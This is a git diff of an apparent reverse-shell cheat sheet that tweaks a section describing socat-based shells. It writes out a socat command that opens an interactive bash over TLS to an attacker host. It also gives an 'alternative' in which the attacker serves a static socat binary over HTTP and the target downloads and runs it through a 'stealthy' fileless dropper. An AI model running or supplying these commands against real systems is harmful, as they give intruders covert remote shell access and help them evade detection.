@@ -30,7 +30,8 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,ve
 
 ## Alternative
 
-Alternatively, you can host a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and download + execute it using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
+Alternatively, if target does not have `socat`:
+**Host** a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and **download + execute it** using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
 ```shell
 # On attacker machine
 # get socat static & expose it
@@ -39,5 +40,5 @@ python3 -m http.server 8080
 
 # On target machine
 # Use already downloaded fileless-xec to download socat and stealthy launch it with argument
-fileless-xec [ATTACKER_URL]/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
+fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
 ```
